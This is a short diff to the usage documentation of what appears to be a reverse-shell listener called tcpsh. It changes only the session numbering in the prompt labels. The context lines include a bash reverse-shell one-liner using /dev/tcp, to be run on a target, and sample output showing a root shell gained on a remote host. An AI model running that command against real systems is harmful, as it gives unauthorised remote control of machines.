@@ -254,9 +254,9 @@ tcpsh> open 4444
 # Target: bash -i >& /dev/tcp/your-ip/4444 0>&1
 [+] New connection on :4444 from 10.0.0.5:43210 (session 1)
 tcpsh> use 4444
-[4444]> id
+[4444:1]> id
 uid=0(root) gid=0(root) groups=0(root)
-[4444]> +back
+[4444:1]> +back
 tcpsh>
 ```
 
@@ -289,9 +289,9 @@ tcpsh> list conn
   3      4445     10.0.0.4:50003             active
 
 tcpsh> use 4444:1
-[4444]> +bg
+[4444:1]> +bg
 tcpsh> use 4444:2
-[4444]>
+[4444:2]>
 ```
 
 ---
